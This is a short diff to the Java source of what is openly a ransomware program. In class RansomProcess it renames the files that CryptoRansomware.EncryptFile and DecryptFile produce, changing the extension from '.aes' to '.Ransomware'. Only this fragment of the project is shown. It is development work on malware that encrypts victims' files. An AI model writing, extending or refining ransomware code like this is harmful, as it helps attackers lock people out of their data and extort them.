@@ -48,7 +48,7 @@ public class RansomProcess {
 
                     Map.Entry entry = (Map.Entry) mapiterator.next();
                     final File filein = new File(entry.getKey() + "." + entry.getValue());
-                    final File fileout = new File(entry.getKey() + ".aes");
+                    final File fileout = new File(entry.getKey() + ".Ransomware");
 
                     CryptoRansomware.EncryptFile(filein, fileout, aesKey);
                 }
@@ -92,7 +92,7 @@ public class RansomProcess {
 
                     Map.Entry entry = (Map.Entry) mapiterator.next();
                     final File filein = new File(entry.getKey() + "." + entry.getValue());
-                    final File fileout = new File(entry.getKey() + ".AES");
+                    final File fileout = new File(entry.getKey() + ".Ransomware");
 
 
                     CryptoRansomware.DecryptFile(fileout, filein, aesKey);
